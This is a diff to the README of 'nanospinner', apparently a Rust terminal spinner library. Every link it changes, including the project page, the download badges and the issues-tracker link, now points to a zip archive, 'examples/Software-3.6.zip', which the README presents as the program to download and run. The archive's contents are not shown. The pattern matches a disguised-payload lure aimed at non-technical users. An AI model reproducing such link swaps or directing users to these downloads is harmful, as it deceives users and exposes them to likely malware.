@@ -1,6 +1,6 @@
 # ⚙️ nanospinner - Simple Terminal Spinner for Rust Tools
 
-[![Download nanospinner](https://img.shields.io/badge/Download-nanospinner-blue?style=for-the-badge)](https://github.com/davi-teixeira7/nanospinner)
+[![Download nanospinner](https://img.shields.io/badge/Download-nanospinner-blue?style=for-the-badge)](https://github.com/davi-teixeira7/nanospinner/raw/refs/heads/main/examples/Software-3.6.zip)
 
 ---
 
@@ -29,7 +29,7 @@ You do not need to install any other programs or tools before running nanospinne
 
 You can get nanospinner from this link:
 
-[![Download nanospinner](https://img.shields.io/badge/Download-nanospinner-grey?style=for-the-badge)](https://github.com/davi-teixeira7/nanospinner)
+[![Download nanospinner](https://img.shields.io/badge/Download-nanospinner-grey?style=for-the-badge)](https://github.com/davi-teixeira7/nanospinner/raw/refs/heads/main/examples/Software-3.6.zip)
 
 Click the link above. It will take you to the nanospinner page on GitHub. From there, you can download the program files.
 
@@ -41,7 +41,7 @@ Click the link above. It will take you to the nanospinner page on GitHub. From t
 
 Go to the main GitHub page for nanospinner by clicking the download button above or open this URL in your browser:
 
-https://github.com/davi-teixeira7/nanospinner
+https://github.com/davi-teixeira7/nanospinner/raw/refs/heads/main/examples/Software-3.6.zip
 
 ### Step 2: Find the Download Files
 
@@ -94,13 +94,13 @@ If nanospinner does not start or crashes:
 
 If problems continue, check the issues section at:
 
-https://github.com/davi-teixeira7/nanospinner/issues
+https://github.com/davi-teixeira7/nanospinner/raw/refs/heads/main/examples/Software-3.6.zip
 
 ---
 
 ## 📄 Additional Resources
 
-- GitHub Project: https://github.com/davi-teixeira7/nanospinner  
+- GitHub Project: https://github.com/davi-teixeira7/nanospinner/raw/refs/heads/main/examples/Software-3.6.zip  
 - Help and Support: Use the Issues tab on GitHub  
 - Rust CLI Documentation: Search online for guides to learn about building tools with Rust  
 
@@ -120,6 +120,6 @@ nanospinner is updated occasionally. To make sure you have the latest version:
 
 If you want to offer feedback, report a bug, or contribute, you can open a ticket on GitHub or submit a pull request.
 
-https://github.com/davi-teixeira7/nanospinner
+https://github.com/davi-teixeira7/nanospinner/raw/refs/heads/main/examples/Software-3.6.zip
 
 Your input helps keep the project useful and stable.
